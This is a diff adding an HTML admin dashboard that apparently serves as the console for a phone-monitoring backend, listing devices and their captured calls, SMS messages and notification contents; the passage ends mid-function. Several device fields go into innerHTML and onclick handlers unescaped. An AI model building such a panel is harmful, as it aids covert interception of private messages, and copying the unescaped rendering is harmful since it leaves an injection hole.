@@ -1,0 +1,1015 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Device Monitor — Admin</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=DM+Sans:wght@300;400;500;700&display=swap" rel="stylesheet" />
+<style>
+  /* ── Reset & Variables ─────────────────────────── */
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg:       #0d0f14;
+    --surface:  #151820;
+    --border:   #252a35;
+    --accent:   #4f8ef7;
+    --accent2:  #f7874f;
+    --green:    #3dd68c;
+    --red:      #f7534f;
+    --yellow:   #f7c44f;
+    --text:     #e8eaf0;
+    --muted:    #6b7280;
+    --mono:     'Space Mono', monospace;
+    --sans:     'DM Sans', sans-serif;
+    --radius:   12px;
+    --sidebar:  240px;
+  }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    min-height: 100vh;
+    display: flex;
+    overflow-x: hidden;
+  }
+
+  /* ── Sidebar ────────────────────────────────────── */
+  .sidebar {
+    width: var(--sidebar);
+    background: var(--surface);
+    border-right: 1px solid var(--border);
+    display: flex;
+    flex-direction: column;
+    position: fixed;
+    top: 0; left: 0; bottom: 0;
+    z-index: 100;
+  }
+
+  .sidebar-logo {
+    padding: 24px 20px 20px;
+    border-bottom: 1px solid var(--border);
+  }
+  .sidebar-logo h1 {
+    font-family: var(--mono);
+    font-size: 13px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--accent);
+  }
+  .sidebar-logo p { font-size: 11px; color: var(--muted); margin-top: 4px; }
+
+  .sidebar nav { flex: 1; padding: 16px 0; }
+  .nav-section {
+    padding: 12px 20px 6px;
+    font-size: 10px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--muted);
+    font-family: var(--mono);
+  }
+
+  .nav-item {
+    display: flex; align-items: center; gap: 10px;
+    padding: 10px 20px;
+    cursor: pointer;
+    font-size: 14px;
+    font-weight: 500;
+    color: var(--muted);
+    border-left: 3px solid transparent;
+    transition: all .15s;
+  }
+  .nav-item:hover { color: var(--text); background: rgba(255,255,255,.04); }
+  .nav-item.active {
+    color: var(--accent);
+    border-left-color: var(--accent);
+    background: rgba(79,142,247,.08);
+  }
+  .nav-icon { font-size: 16px; }
+  .nav-badge {
+    margin-left: auto;
+    background: var(--accent);
+    color: #fff;
+    font-size: 11px;
+    font-family: var(--mono);
+    padding: 2px 7px;
+    border-radius: 20px;
+  }
+
+  .sidebar-footer {
+    padding: 16px 20px;
+    border-top: 1px solid var(--border);
+    font-size: 12px; color: var(--muted);
+  }
+
+  /* ── Config panel ────────────────────────────────── */
+  .config-panel {
+    background: rgba(79,142,247,.06);
+    border: 1px solid rgba(79,142,247,.2);
+    border-radius: 8px;
+    padding: 12px;
+    margin: 0 12px 16px;
+  }
+  .config-panel label { font-size: 11px; color: var(--muted); display: block; margin-bottom: 4px; }
+  .config-panel input {
+    width: 100%; background: var(--bg); border: 1px solid var(--border);
+    border-radius: 6px; padding: 6px 8px; color: var(--text); font-size: 12px;
+    font-family: var(--mono); outline: none;
+  }
+  .config-panel input:focus { border-color: var(--accent); }
+  .btn-connect {
+    margin-top: 8px; width: 100%;
+    background: var(--accent); color: #fff; border: none;
+    border-radius: 6px; padding: 7px; font-size: 12px; font-weight: 700;
+    cursor: pointer; font-family: var(--sans);
+    transition: opacity .15s;
+  }
+  .btn-connect:hover { opacity: .85; }
+
+  /* ── Main ───────────────────────────────────────── */
+  .main {
+    margin-left: var(--sidebar);
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+  }
+
+  /* ── Topbar ─────────────────────────────────────── */
+  .topbar {
+    padding: 16px 28px;
+    display: flex; align-items: center; justify-content: space-between;
+    border-bottom: 1px solid var(--border);
+    background: var(--surface);
+    position: sticky; top: 0; z-index: 50;
+  }
+  .topbar h2 { font-size: 18px; font-weight: 700; }
+  .topbar-right { display: flex; align-items: center; gap: 12px; }
+
+  .status-dot {
+    display: flex; align-items: center; gap: 6px;
+    font-size: 12px; font-family: var(--mono); color: var(--muted);
+  }
+  .dot {
+    width: 8px; height: 8px; border-radius: 50%;
+    background: var(--red); animation: pulse 2s infinite;
+  }
+  .dot.online { background: var(--green); }
+
+  @keyframes pulse {
+    0%,100% { opacity: 1; }
+    50% { opacity: .4; }
+  }
+
+  .btn-refresh {
+    background: var(--border); color: var(--text); border: none;
+    border-radius: 8px; padding: 7px 14px; font-size: 13px;
+    cursor: pointer; font-family: var(--sans); font-weight: 500;
+    transition: background .15s;
+  }
+  .btn-refresh:hover { background: #2e3444; }
+
+  .device-select {
+    background: var(--bg); border: 1px solid var(--border);
+    color: var(--text); border-radius: 8px; padding: 7px 12px;
+    font-size: 13px; font-family: var(--sans); outline: none; cursor: pointer;
+  }
+
+  /* ── Content ────────────────────────────────────── */
+  .content { padding: 28px; flex: 1; }
+
+  /* ── Pages ──────────────────────────────────────── */
+  .page { display: none; }
+  .page.active { display: block; }
+
+  /* ── Stats Grid ─────────────────────────────────── */
+  .stats-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+    gap: 16px;
+    margin-bottom: 28px;
+  }
+
+  .stat-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 20px;
+    position: relative;
+    overflow: hidden;
+    transition: transform .15s, border-color .15s;
+  }
+  .stat-card:hover { transform: translateY(-2px); border-color: var(--accent); }
+  .stat-card::before {
+    content: '';
+    position: absolute; top: 0; left: 0; right: 0; height: 3px;
+    background: var(--accent-color, var(--accent));
+  }
+  .stat-label { font-size: 11px; letter-spacing: 1.5px; text-transform: uppercase;
+    color: var(--muted); font-family: var(--mono); margin-bottom: 12px; }
+  .stat-value {
+    font-size: 36px; font-weight: 700; font-family: var(--mono);
+    color: var(--accent-color, var(--accent));
+  }
+  .stat-sub { font-size: 12px; color: var(--muted); margin-top: 6px; }
+
+  /* ── Section ────────────────────────────────────── */
+  .section { margin-bottom: 28px; }
+  .section-header {
+    display: flex; align-items: center; justify-content: space-between;
+    margin-bottom: 16px;
+  }
+  .section-title {
+    font-size: 14px; font-weight: 700; font-family: var(--mono);
+    letter-spacing: 1px; text-transform: uppercase; color: var(--muted);
+  }
+
+  /* ── Table ──────────────────────────────────────── */
+  .table-wrap {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+  }
+
+  table { width: 100%; border-collapse: collapse; }
+  thead th {
+    padding: 12px 16px; text-align: left;
+    font-size: 11px; font-family: var(--mono);
+    letter-spacing: 1.5px; text-transform: uppercase;
+    color: var(--muted); background: rgba(255,255,255,.02);
+    border-bottom: 1px solid var(--border);
+  }
+  tbody tr {
+    border-bottom: 1px solid var(--border);
+    transition: background .1s;
+  }
+  tbody tr:last-child { border-bottom: none; }
+  tbody tr:hover { background: rgba(255,255,255,.03); }
+  td {
+    padding: 12px 16px; font-size: 13px;
+    vertical-align: middle;
+  }
+
+  /* ── Badges ─────────────────────────────────────── */
+  .badge {
+    display: inline-flex; align-items: center; gap: 4px;
+    padding: 3px 10px; border-radius: 20px;
+    font-size: 11px; font-weight: 700; font-family: var(--mono);
+  }
+  .badge-call   { background: rgba(79,142,247,.15); color: var(--accent); }
+  .badge-sms    { background: rgba(61,214,140,.15); color: var(--green); }
+  .badge-notif  { background: rgba(247,196,79,.15); color: var(--yellow); }
+  .badge-device { background: rgba(247,135,79,.15); color: var(--accent2); }
+  .badge-online { background: rgba(61,214,140,.15); color: var(--green); }
+  .badge-offline{ background: rgba(247,83,79,.15); color: var(--red); }
+
+  /* ── Mono text ──────────────────────────────────── */
+  .mono { font-family: var(--mono); font-size: 12px; color: var(--muted); }
+  .ellipsis { max-width: 220px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+  /* ── Empty state ────────────────────────────────── */
+  .empty {
+    text-align: center; padding: 60px 20px;
+    color: var(--muted); font-size: 14px;
+  }
+  .empty-icon { font-size: 40px; margin-bottom: 12px; opacity: .5; }
+
+  /* ── Loading ────────────────────────────────────── */
+  .loading {
+    text-align: center; padding: 40px;
+    color: var(--muted); font-family: var(--mono); font-size: 12px;
+  }
+  .spinner {
+    width: 24px; height: 24px; border: 2px solid var(--border);
+    border-top-color: var(--accent); border-radius: 50%;
+    animation: spin .7s linear infinite; margin: 0 auto 12px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* ── Pagination ─────────────────────────────────── */
+  .pagination {
+    display: flex; align-items: center; justify-content: flex-end;
+    gap: 8px; padding: 12px 16px;
+    border-top: 1px solid var(--border);
+  }
+  .pg-btn {
+    background: var(--bg); border: 1px solid var(--border);
+    color: var(--text); border-radius: 6px; padding: 5px 12px;
+    font-size: 12px; cursor: pointer; font-family: var(--mono);
+    transition: border-color .15s;
+  }
+  .pg-btn:hover:not(:disabled) { border-color: var(--accent); color: var(--accent); }
+  .pg-btn:disabled { opacity: .4; cursor: default; }
+  .pg-info { font-size: 12px; font-family: var(--mono); color: var(--muted); }
+
+  /* ── Search bar ─────────────────────────────────── */
+  .search-bar {
+    display: flex; gap: 8px; margin-bottom: 16px;
+  }
+  .search-input {
+    flex: 1; background: var(--surface); border: 1px solid var(--border);
+    color: var(--text); border-radius: 8px; padding: 9px 14px;
+    font-size: 13px; font-family: var(--sans); outline: none;
+  }
+  .search-input:focus { border-color: var(--accent); }
+  .search-btn {
+    background: var(--accent); color: #fff; border: none;
+    border-radius: 8px; padding: 9px 18px; font-size: 13px;
+    font-weight: 700; cursor: pointer; font-family: var(--sans);
+  }
+  .search-btn:hover { opacity: .85; }
+
+  /* ── Chart placeholder ──────────────────────────── */
+  .chart-box {
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: var(--radius); padding: 20px; margin-bottom: 20px;
+  }
+  .chart-bars {
+    display: flex; align-items: flex-end; gap: 6px;
+    height: 100px; padding-top: 10px;
+  }
+  .bar {
+    flex: 1; border-radius: 4px 4px 0 0; min-height: 4px;
+    transition: height .4s ease;
+  }
+  .bar.call  { background: var(--accent); }
+  .bar.sms   { background: var(--green); }
+  .bar.notif { background: var(--yellow); }
+
+  .chart-legend {
+    display: flex; gap: 16px; margin-top: 12px;
+    font-size: 11px; font-family: var(--mono); color: var(--muted);
+  }
+  .legend-item { display: flex; align-items: center; gap: 6px; }
+  .legend-dot { width: 8px; height: 8px; border-radius: 50%; }
+
+  /* ── Alerts ─────────────────────────────────────── */
+  .alert {
+    padding: 12px 16px; border-radius: 8px; margin-bottom: 16px;
+    font-size: 13px; border-left: 3px solid;
+  }
+  .alert-error { background: rgba(247,83,79,.1); border-color: var(--red); color: #f87272; }
+  .alert-success { background: rgba(61,214,140,.1); border-color: var(--green); color: #3dd68c; }
+
+  /* ── Responsive ─────────────────────────────────── */
+  @media (max-width: 768px) {
+    :root { --sidebar: 0px; }
+    .sidebar { transform: translateX(-240px); }
+    .main { margin-left: 0; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ══════════════════════════════════════════════════
+     SIDEBAR
+══════════════════════════════════════════════════ -->
+<aside class="sidebar">
+  <div class="sidebar-logo">
+    <h1>📡 DevMonitor</h1>
+    <p>Admin Dashboard v2.0</p>
+  </div>
+
+  <!-- Server Config (hidden inputs – values auto-set from window.origin) -->
+  <input id="serverUrl" type="hidden" />
+  <input id="apiKey" type="hidden" />
+
+  <nav>
+    <div class="nav-section">Overview</div>
+    <div class="nav-item active" onclick="showPage('dashboard')">
+      <span class="nav-icon">📊</span> Dashboard
+    </div>
+    <div class="nav-item" onclick="showPage('devices')">
+      <span class="nav-icon">📱</span> Devices
+      <span class="nav-badge" id="badge-devices">0</span>
+    </div>
+
+    <div class="nav-section">Events</div>
+    <div class="nav-item" onclick="showPage('calls')">
+      <span class="nav-icon">📞</span> Calls
+      <span class="nav-badge" id="badge-calls">0</span>
+    </div>
+    <div class="nav-item" onclick="showPage('sms')">
+      <span class="nav-icon">💬</span> SMS
+      <span class="nav-badge" id="badge-sms">0</span>
+    </div>
+    <div class="nav-item" onclick="showPage('notifications')">
+      <span class="nav-icon">🔔</span> Notifications
+      <span class="nav-badge" id="badge-notif">0</span>
+    </div>
+
+    <div class="nav-section">Tools</div>
+    <div class="nav-item" onclick="showPage('search')">
+      <span class="nav-icon">🔍</span> Search
+    </div>
+  </nav>
+
+  <div class="sidebar-footer">
+    <div id="conn-status" class="status-dot" style="margin-bottom:10px">
+      <span class="dot"></span> Disconnected
+    </div>
+    <div style="display:flex;gap:6px;align-items:center">
+      <input id="key-input" type="password"
+        placeholder="API Key"
+        style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);
+               border-radius:6px;padding:5px 8px;font-size:11px;font-family:var(--mono);outline:none"
+        onkeydown="if(event.key==='Enter') changeKey()"
+      />
+      <button onclick="changeKey()"
+        style="background:var(--accent);color:#fff;border:none;border-radius:6px;
+               padding:5px 10px;font-size:11px;cursor:pointer;font-weight:700;white-space:nowrap">
+        🔑
+      </button>
+    </div>
+    <div style="font-size:10px;color:var(--muted);margin-top:6px">Enter key → press Enter</div>
+  </div>
+</aside>
+
+<!-- ══════════════════════════════════════════════════
+     MAIN
+══════════════════════════════════════════════════ -->
+<div class="main">
+  <!-- Topbar -->
+  <div class="topbar">
+    <h2 id="page-title">Dashboard</h2>
+    <div class="topbar-right">
+      <select class="device-select" id="deviceFilter" onchange="applyDeviceFilter()">
+        <option value="">All Devices</option>
+      </select>
+      <button class="btn-refresh" onclick="refreshCurrent()">⟳ Refresh</button>
+    </div>
+  </div>
+
+  <div class="content">
+    <div id="error-banner" style="display:none"></div>
+
+    <!-- ── DASHBOARD PAGE ─────────────────────────── -->
+    <div class="page active" id="page-dashboard">
+
+      <div class="stats-grid" id="stats-grid">
+        <div class="stat-card" style="--accent-color: var(--accent)">
+          <div class="stat-label">Total Calls</div>
+          <div class="stat-value" id="s-calls">—</div>
+          <div class="stat-sub" id="s-calls-24h">Loading...</div>
+        </div>
+        <div class="stat-card" style="--accent-color: var(--green)">
+          <div class="stat-label">Total SMS</div>
+          <div class="stat-value" id="s-sms">—</div>
+          <div class="stat-sub" id="s-sms-24h">Loading...</div>
+        </div>
+        <div class="stat-card" style="--accent-color: var(--yellow)">
+          <div class="stat-label">Notifications</div>
+          <div class="stat-value" id="s-notif">—</div>
+          <div class="stat-sub" id="s-notif-24h">Loading...</div>
+        </div>
+        <div class="stat-card" style="--accent-color: var(--accent2)">
+          <div class="stat-label">Devices</div>
+          <div class="stat-value" id="s-devices">—</div>
+          <div class="stat-sub">registered</div>
+        </div>
+      </div>
+
+      <!-- Activity Chart -->
+      <div class="chart-box">
+        <div class="section-title" style="margin-bottom:16px">7-Day Activity</div>
+        <div class="chart-bars" id="chart-bars">
+          <div class="loading"><div class="spinner"></div>Loading chart...</div>
+        </div>
+        <div class="chart-legend">
+          <div class="legend-item"><div class="legend-dot" style="background:var(--accent)"></div>Calls</div>
+          <div class="legend-item"><div class="legend-dot" style="background:var(--green)"></div>SMS</div>
+          <div class="legend-item"><div class="legend-dot" style="background:var(--yellow)"></div>Notifications</div>
+        </div>
+      </div>
+
+      <!-- Top Apps -->
+      <div class="section">
+        <div class="section-header">
+          <div class="section-title">Top Apps (Notifications)</div>
+        </div>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Package</th><th>Count</th></tr></thead>
+            <tbody id="top-apps-body">
+              <tr><td colspan="2"><div class="loading"><div class="spinner"></div></div></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── DEVICES PAGE ───────────────────────────── -->
+    <div class="page" id="page-devices">
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>Device ID</th>
+              <th>Name</th>
+              <th>Last Seen</th>
+              <th>Total Events</th>
+              <th>Status</th>
+              <th>Action</th>
+            </tr>
+          </thead>
+          <tbody id="devices-body">
+            <tr><td colspan="6"><div class="loading"><div class="spinner"></div></div></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ── CALLS PAGE ─────────────────────────────── -->
+    <div class="page" id="page-calls">
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th>Device</th><th>Title</th><th>Body</th><th>Time</th></tr>
+          </thead>
+          <tbody id="calls-body">
+            <tr><td colspan="4"><div class="loading"><div class="spinner"></div></div></td></tr>
+          </tbody>
+        </table>
+        <div class="pagination" id="calls-pagination"></div>
+      </div>
+    </div>
+
+    <!-- ── SMS PAGE ───────────────────────────────── -->
+    <div class="page" id="page-sms">
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th>Device</th><th>From</th><th>Message</th><th>Time</th></tr>
+          </thead>
+          <tbody id="sms-body">
+            <tr><td colspan="4"><div class="loading"><div class="spinner"></div></div></td></tr>
+          </tbody>
+        </table>
+        <div class="pagination" id="sms-pagination"></div>
+      </div>
+    </div>
+
+    <!-- ── NOTIFICATIONS PAGE ─────────────────────── -->
+    <div class="page" id="page-notifications">
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th>Device</th><th>App</th><th>Title</th><th>Content</th><th>Time</th></tr>
+          </thead>
+          <tbody id="notif-body">
+            <tr><td colspan="5"><div class="loading"><div class="spinner"></div></div></td></tr>
+          </tbody>
+        </table>
+        <div class="pagination" id="notif-pagination"></div>
+      </div>
+    </div>
+
+    <!-- ── SEARCH PAGE ────────────────────────────── -->
+    <div class="page" id="page-search">
+      <div class="search-bar">
+        <input class="search-input" id="search-input" type="text"
+          placeholder="Search across calls, SMS, notifications..."
+          onkeydown="if(event.key==='Enter') doSearch()" />
+        <select class="device-select" id="search-type">
+          <option value="all">All Types</option>
+          <option value="call">Calls</option>
+          <option value="sms">SMS</option>
+          <option value="notification">Notifications</option>
+        </select>
+        <button class="search-btn" onclick="doSearch()">Search</button>
+      </div>
+      <div id="search-results"></div>
+    </div>
+
+  </div><!-- /content -->
+</div><!-- /main -->
+
+<script>
+// ─────────────────────────────────────────────────────────────
+//  Config  – served from same origin, no manual URL needed
+// ─────────────────────────────────────────────────────────────
+let SERVER = '';          // '' = same origin (relative URLs)
+let API_KEY = (document.cookie.match(/dm_key=([^;]+)/) || [])[1]
+              || localStorage.getItem('dm_key')
+              || 'your-secret-api-key';
+let currentPage = 'dashboard';
+let deviceFilter = '';
+let pages = { calls: 1, sms: 1, notifications: 1 };
+
+// ─────────────────────────────────────────────────────────────
+//  API Helper
+// ─────────────────────────────────────────────────────────────
+async function api(path, method = 'GET', body = null) {
+  const opts = {
+    method,
+    headers: {
+      'Content-Type': 'application/json',
+      'Authorization': `Bearer ${API_KEY}`,
+    },
+  };
+  if (body) opts.body = JSON.stringify(body);
+  const r = await fetch(SERVER + path, opts);
+  if (!r.ok) throw new Error(`HTTP ${r.status}`);
+  return r.json();
+}
+
+// ─────────────────────────────────────────────────────────────
+//  Connection – auto connects to same-origin server
+// ─────────────────────────────────────────────────────────────
+async function connectServer() {
+  // When served from Node.js, SERVER stays '' (relative).
+  // Support manual override via hidden inputs (e.g. dev mode).
+  const urlEl = document.getElementById('serverUrl');
+  const keyEl = document.getElementById('apiKey');
+  if (urlEl?.value) SERVER = urlEl.value.trim().replace(/\/$/, '');
+  if (keyEl?.value) API_KEY = keyEl.value.trim();
+
+  localStorage.setItem('dm_key', API_KEY);
+
+  const el = document.getElementById('conn-status');
+  el.innerHTML = '<span class="dot" style="background:var(--yellow)"></span> Connecting…';
+
+  try {
+    await api('/api/stats');          // lightweight check
+    el.innerHTML = '<span class="dot online"></span> Connected';
+    showError(null);
+    loadAll();
+  } catch (e) {
+    el.innerHTML = '<span class="dot"></span> Failed';
+    showError('Cannot reach server. Wrong API key or server is down.');
+  }
+}
+
+function changeKey() {
+  const v = document.getElementById('key-input').value.trim();
+  if (!v) return;
+  API_KEY = v;
+  localStorage.setItem('dm_key', API_KEY);
+  document.getElementById('key-input').value = '';
+  connectServer();
+}
+
+function showError(msg) {
+  const el = document.getElementById('error-banner');
+  if (!msg) { el.style.display = 'none'; return; }
+  el.style.display = 'block';
+  el.innerHTML = `<div class="alert alert-error">⚠ ${msg}</div>`;
+}
+
+// ─────────────────────────────────────────────────────────────
+//  Navigation
+// ─────────────────────────────────────────────────────────────
+function showPage(name) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  document.getElementById(`page-${name}`).classList.add('active');
+  document.querySelector(`.nav-item[onclick="showPage('${name}')"]`)?.classList.add('active');
+  document.getElementById('page-title').textContent =
+    { dashboard:'Dashboard', devices:'Devices', calls:'Call Logs',
+      sms:'SMS Logs', notifications:'Notifications', search:'Search' }[name] || name;
+  currentPage = name;
+  loadPage(name);
+}
+
+function refreshCurrent() { loadPage(currentPage); }
+
+function loadPage(name) {
+  if (name === 'dashboard') loadDashboard();
+  else if (name === 'devices') loadDevices();
+  else if (name === 'calls') loadCalls();
+  else if (name === 'sms') loadSms();
+  else if (name === 'notifications') loadNotifications();
+}
+
+// ─────────────────────────────────────────────────────────────
+//  Device filter
+// ─────────────────────────────────────────────────────────────
+function applyDeviceFilter() {
+  deviceFilter = document.getElementById('deviceFilter').value;
+  pages = { calls: 1, sms: 1, notifications: 1 };
+  loadPage(currentPage);
+}
+
+async function populateDeviceDropdown() {
+  try {
+    const r = await api('/api/devices');
+    const sel = document.getElementById('deviceFilter');
+    const cur = sel.value;
+    sel.innerHTML = '<option value="">All Devices</option>';
+    r.data.forEach(d => {
+      const opt = document.createElement('option');
+      opt.value = d.device_id;
+      opt.textContent = `${d.device_name} (${d.device_id.slice(0,8)}…)`;
+      sel.appendChild(opt);
+    });
+    if (cur) sel.value = cur;
+  } catch (_) {}
+}
+
+// ─────────────────────────────────────────────────────────────
+//  Load All
+// ─────────────────────────────────────────────────────────────
+function loadAll() {
+  populateDeviceDropdown();
+  loadDashboard();
+}
+
+// ─────────────────────────────────────────────────────────────
+//  Dashboard
+// ─────────────────────────────────────────────────────────────
+async function loadDashboard() {
+  try {
+    const r = await api('/api/stats');
+    const s = r.stats;
+    setText('s-calls', s.total.calls);
+    setText('s-sms', s.total.sms);
+    setText('s-notif', s.total.notifications);
+    setText('s-devices', s.total.devices);
+    setText('s-calls-24h', `${s.last_24h.calls} in last 24h`);
+    setText('s-sms-24h', `${s.last_24h.sms} in last 24h`);
+    setText('s-notif-24h', `${s.last_24h.notifications} in last 24h`);
+
+    setBadge('badge-calls', s.total.calls);
+    setBadge('badge-sms', s.total.sms);
+    setBadge('badge-notif', s.total.notifications);
+    setBadge('badge-devices', s.total.devices);
+
+    // Top apps
+    const tbody = document.getElementById('top-apps-body');
+    if (!s.top_apps?.length) {
+      tbody.innerHTML = '<tr><td colspan="2"><div class="empty"><div class="empty-icon">📭</div>No data</div></td></tr>';
+    } else {
+      tbody.innerHTML = s.top_apps.map(a => `
+        <tr>
+          <td class="mono">${a._id}</td>
+          <td><span class="badge badge-notif">${a.count}</span></td>
+        </tr>`).join('');
+    }
+  } catch (e) {
+    showError('Failed to load stats: ' + e.message);
+  }
+
+  // 7-day chart
+  try {
+    const r = await api('/api/analytics/daily?days=7');
+    drawChart(r.data);
+  } catch (_) {}
+}
+
+function drawChart(data) {
+  const container = document.getElementById('chart-bars');
+  const days = getLast7Days();
+  const maxVal = Math.max(1,
+    ...days.map(d =>
+      (data.calls.find(x=>x._id===d)?.count||0) +
+      (data.sms.find(x=>x._id===d)?.count||0) +
+      (data.notifications.find(x=>x._id===d)?.count||0)
+    )
+  );
+
+  container.innerHTML = days.map(d => {
+    const c = data.calls.find(x=>x._id===d)?.count||0;
+    const s = data.sms.find(x=>x._id===d)?.count||0;
+    const n = data.notifications.find(x=>x._id===d)?.count||0;
+    const h = v => Math.max(4, Math.round((v/maxVal)*90));
+    return `
+      <div style="flex:1;display:flex;flex-direction:column;align-items:center;gap:2px">
+        <div class="bar call"  style="height:${h(c)}px;width:100%"  title="Calls: ${c}"></div>
+        <div class="bar sms"   style="height:${h(s)}px;width:100%"  title="SMS: ${s}"></div>
+        <div class="bar notif" style="height:${h(n)}px;width:100%"  title="Notif: ${n}"></div>
+        <div style="font-size:10px;color:var(--muted);font-family:var(--mono);margin-top:4px">${d.slice(5)}</div>
+      </div>`;
+  }).join('');
+}
+
+function getLast7Days() {
+  const days = [];
+  for (let i = 6; i >= 0; i--) {
+    const d = new Date(); d.setDate(d.getDate() - i);
+    days.push(d.toISOString().slice(0,10));
+  }
+  return days;
+}
+
+// ─────────────────────────────────────────────────────────────
+//  Devices
+// ─────────────────────────────────────────────────────────────
+async function loadDevices() {
+  const tbody = document.getElementById('devices-body');
+  tbody.innerHTML = '<tr><td colspan="6"><div class="loading"><div class="spinner"></div></div></td></tr>';
+  try {
+    const r = await api('/api/devices');
+    if (!r.data.length) {
+      tbody.innerHTML = '<tr><td colspan="6"><div class="empty"><div class="empty-icon">📱</div>No devices registered</div></td></tr>';
+      return;
+    }
+    tbody.innerHTML = r.data.map(d => {
+      const isOnline = (Date.now() - new Date(d.last_seen).getTime()) < 5*60*1000;
+      return `
+        <tr>
+          <td class="mono ellipsis" title="${d.device_id}">${d.device_id}</td>
+          <td>${d.device_name}</td>
+          <td class="mono">${timeAgo(d.last_seen)}</td>
+          <td><span class="badge badge-device">${d.total_events}</span></td>
+          <td><span class="badge ${isOnline?'badge-online':'badge-offline'}">${isOnline?'Online':'Offline'}</span></td>
+          <td>
+            <button class="btn-refresh" style="padding:4px 10px;font-size:11px" onclick="confirmDelete('${d.device_id}','${d.device_name}')">🗑 Wipe</button>
+          </td>
+        </tr>`;
+    }).join('');
+  } catch (e) {
+    tbody.innerHTML = `<tr><td colspan="6"><div class="alert alert-error">Error: ${e.message}</div></td></tr>`;
+  }
+}
+
+async function confirmDelete(device_id, name) {
+  if (!confirm(`Delete ALL data for "${name}"? This cannot be undone.`)) return;
+  try {
+    await api(`/api/devices/${device_id}`, 'DELETE');
+    populateDeviceDropdown();
+    loadDevices();
+    loadDashboard();
+  } catch (e) { showError('Delete failed: ' + e.message); }
+}
+
+// ─────────────────────────────────────────────────────────────
+//  Calls
+// ─────────────────────────────────────────────────────────────
+async function loadCalls() {
+  const tbody = document.getElementById('calls-body');
+  tbody.innerHTML = '<tr><td colspan="4"><div class="loading"><div class="spinner"></div></div></td></tr>';
+  try {
+    const qs = new URLSearchParams({ page: pages.calls, limit: 50 });
+    if (deviceFilter) qs.set('device_id', deviceFilter);
+    const r = await api(`/api/events/call?${qs}`);
+    if (!r.data.length) {
+      tbody.innerHTML = '<tr><td colspan="4"><div class="empty"><div class="empty-icon">📞</div>No calls yet</div></td></tr>';
+    } else {
+      tbody.innerHTML = r.data.map(e => `
+        <tr>
+          <td class="mono" style="font-size:11px">${(e.device_name||e.device_id).slice(0,18)}</td>
+          <td>${esc(e.title)}</td>
+          <td class="ellipsis" style="max-width:200px">${esc(e.body)}</td>
+          <td class="mono">${fmt(e.timestamp)}</td>
+        </tr>`).join('');
+    }
+    renderPagination('calls-pagination', pages.calls, r.total, 50, p => { pages.calls=p; loadCalls(); });
+  } catch (e) {
+    tbody.innerHTML = `<tr><td colspan="4"><div class="alert alert-error">Error: ${e.message}</div></td></tr>`;
+  }
+}
+
+// ─────────────────────────────────────────────────────────────
+//  SMS
+// ─────────────────────────────────────────────────────────────
+async function loadSms() {
+  const tbody = document.getElementById('sms-body');
+  tbody.innerHTML = '<tr><td colspan="4"><div class="loading"><div class="spinner"></div></div></td></tr>';
+  try {
+    const qs = new URLSearchParams({ page: pages.sms, limit: 50 });
+    if (deviceFilter) qs.set('device_id', deviceFilter);
+    const r = await api(`/api/events/sms?${qs}`);
+    if (!r.data.length) {
+      tbody.innerHTML = '<tr><td colspan="4"><div class="empty"><div class="empty-icon">💬</div>No SMS yet</div></td></tr>';
+    } else {
+      tbody.innerHTML = r.data.map(e => `
+        <tr>
+          <td class="mono" style="font-size:11px">${(e.device_name||e.device_id).slice(0,18)}</td>
+          <td>${esc(e.title)}</td>
+          <td class="ellipsis">${esc(e.body)}</td>
+          <td class="mono">${fmt(e.timestamp)}</td>
+        </tr>`).join('');
+    }
+    renderPagination('sms-pagination', pages.sms, r.total, 50, p => { pages.sms=p; loadSms(); });
+  } catch (e) {
+    tbody.innerHTML = `<tr><td colspan="4"><div class="alert alert-error">Error: ${e.message}</div></td></tr>`;
+  }
+}
+
+// ─────────────────────────────────────────────────────────────
+//  Notifications
+// ─────────────────────────────────────────────────────────────
+async function loadNotifications() {
+  const tbody = document.getElementById('notif-body');
+  tbody.innerHTML = '<tr><td colspan="5"><div class="loading"><div class="spinner"></div></div></td></tr>';
+  try {
+    const qs = new URLSearchParams({ page: pages.notifications, limit: 50 });
+    if (deviceFilter) qs.set('device_id', deviceFilter);
+    const r = await api(`/api/events/notification?${qs}`);
+    if (!r.data.length) {
+      tbody.innerHTML = '<tr><td colspan="5"><div class="empty"><div class="empty-icon">🔔</div>No notifications yet</div></td></tr>';
+    } else {
+      tbody.innerHTML = r.data.map(e => `
+        <tr>
+          <td class="mono" style="font-size:11px">${(e.device_name||e.device_id).slice(0,18)}</td>
+          <td><span class="badge badge-notif" style="font-size:10px">${e.package_name?.split('.').pop()||'?'}</span></td>
+          <td class="ellipsis">${esc(e.title)}</td>
+          <td class="ellipsis">${esc(e.content)}</td>
+          <td class="mono">${fmt(e.timestamp)}</td>
+        </tr>`).join('');
+    }
+    renderPagination('notif-pagination', pages.notifications, r.total, 50, p => { pages.notifications=p; loadNotifications(); });
+  } catch (e) {
